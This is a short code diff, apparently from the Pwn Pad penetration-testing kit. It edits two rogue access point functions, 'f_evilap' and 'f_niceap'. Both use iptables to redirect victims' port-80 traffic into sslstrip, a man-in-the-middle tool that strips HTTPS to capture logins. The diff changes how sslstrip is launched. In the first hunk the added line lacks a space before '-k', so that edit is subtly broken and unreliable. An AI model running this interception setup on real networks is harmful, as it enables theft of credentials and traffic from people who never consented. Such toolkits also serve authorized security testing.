@@ -140,7 +140,7 @@ f_evilap(){
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
   echo "Running sslstrip and saving output to "
-  sslstrip -k -l 10000 & tail -f $logname
+  python /opt/pwnpad/sslstrip/sslstrip.py-k -l 10000 & tail -f $logname
 }
 
 #########################################
@@ -171,7 +171,7 @@ f_niceap(){
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
  
   echo "Running sslstrip and saving output to "
-  sslstrip -k -l 10000 & tail -f $logname
+  python /opt/pwnpad/sslstrip/sslstrip.py -k -l 10000 & tail -f $logname
 }
 
 #########################################
